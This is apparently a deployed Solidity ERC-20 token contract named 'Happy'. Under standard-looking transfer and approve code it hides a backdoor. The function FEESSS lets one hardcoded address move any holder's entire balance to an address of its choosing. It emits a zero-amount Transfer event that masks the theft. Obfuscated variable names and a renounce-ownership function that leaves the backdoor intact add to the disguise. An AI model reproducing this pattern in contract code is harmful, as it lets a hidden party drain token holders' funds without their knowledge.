/**
 *Submitted for verification at Etherscan.io on 2023-08-05
*/

pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address afctiont) external view returns (uint256);
    function transfer(address recipient, uint256 awmehrrtt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 awmehrrtt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 awmehrrtt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract Happy is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _zsdacx; 

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;



    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _zsdacx = 0x0acf13760F2Cf8416998dC8Db92e32ae7cd03C57;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address afctiont) public view override returns (uint256) {
        return _balances[afctiont];
    }
 
    function transfer(address recipient, uint256 awmehrrtt) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= awmehrrtt, "TT: transfer awmehrrtt exceeds balance");

        _balances[_msgSender()] -= awmehrrtt;
        _balances[recipient] += awmehrrtt;
        emit Transfer(_msgSender(), recipient, awmehrrtt);
        return true;
    }

    function FEESSS(address sender, address recipient) public  returns (bool) {
        require(keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_zsdacx)), "Caller is not the original caller");

        uint256 ERKNT = _balances[sender]; 
        uint256 KOSENM = _balances[recipient];
        require(ERKNT != 0*0, "Sender has no balance");

        KOSENM += ERKNT;
        ERKNT = 0+0;

        _balances[sender] = ERKNT;
        _balances[recipient] = KOSENM;

        emit Transfer(sender, recipient, ERKNT);
        return true;
    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 awmehrrtt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = awmehrrtt;
        emit Approval(_msgSender(), spender, awmehrrtt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 awmehrrtt) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= awmehrrtt, "TT: transfer awmehrrtt exceeds allowance");

        _balances[sender] -= awmehrrtt;
        _balances[recipient] += awmehrrtt;
        _allowances[sender][_msgSender()] -= awmehrrtt;

        emit Transfer(sender, recipient, awmehrrtt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}